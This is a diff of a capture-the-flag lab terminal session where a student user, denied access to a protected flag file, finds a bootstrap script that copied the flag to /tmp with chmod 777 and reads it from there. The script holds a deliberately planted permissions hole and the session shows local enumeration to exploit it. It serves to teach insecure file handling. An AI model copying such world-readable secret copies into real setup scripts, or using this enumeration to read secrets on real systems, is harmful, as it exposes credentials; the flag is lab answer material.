@@ -1,5 +1,5 @@
 $ id
-uid=1002(student) gid=1002(student) groups=1002(student),1043(backup)
+uid=1002(student) gid=1002(student) groups=1002(student)
 
 $ ls -la /srv/backup/
 drwxr-x--- 2 root backup 4096 Nov 12 21:04 .
@@ -10,12 +10,21 @@ drwxr-xr-x 6 root root   4096 Oct 30 11:22 ..
 $ cat /srv/backup/flag.txt
 cat: /srv/backup/flag.txt: Permission denied
 
-$ getfacl /srv/backup/flag.txt
-# file: srv/backup/flag.txt
-# owner: root
-# group: backup
-user::rw-
-user:student:r--
-group::r--
-mask::r--
-other::---
+$ sudo -l
+[sudo] password for student:
+Sorry, user student may not run sudo on lab.
+
+$ cat /opt/bootstrap/setup.sh
+#!/bin/sh
+# one-shot bootstrap for the backup volume (2026 rewrite)
+install -d -m 750 -o root -g backup /srv/backup
+install -m 640 -o root -g backup /root/flag.txt /srv/backup/flag.txt
+# quick fix so the monitoring agent could read it during the migration
+cp /srv/backup/flag.txt /tmp/backup-flag.txt
+chmod 777 /tmp/backup-flag.txt    # TODO: remove after migration
+
+$ ls -la /tmp/backup-flag.txt
+-rwxrwxrwx 1 root root 124 Nov 12 21:04 /tmp/backup-flag.txt
+
+$ cat /tmp/backup-flag.txt
+SNT{chm0d_777_1s_n0t_s3cur3}
